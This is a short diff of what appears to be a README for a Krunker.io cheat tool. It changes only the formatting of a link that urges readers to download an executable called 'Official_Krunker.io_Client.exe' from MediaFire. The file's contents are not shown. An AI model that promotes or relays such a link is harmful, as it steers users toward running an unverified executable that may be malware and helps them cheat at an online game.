@@ -18,8 +18,7 @@ Krunker functions
 __________________________________
 >How to download hax
 
-Click this [LINK] and Download!
-https://www.mediafire.com/file/offhtbb9g89frem/Official_Krunker.io_Client.exe/file
+Click this [LINK](https://www.mediafire.com/file/offhtbb9g89frem/Official_Krunker.io_Client.exe/file) and Download!
 __________________________________
 >IF NOT WORK?
 
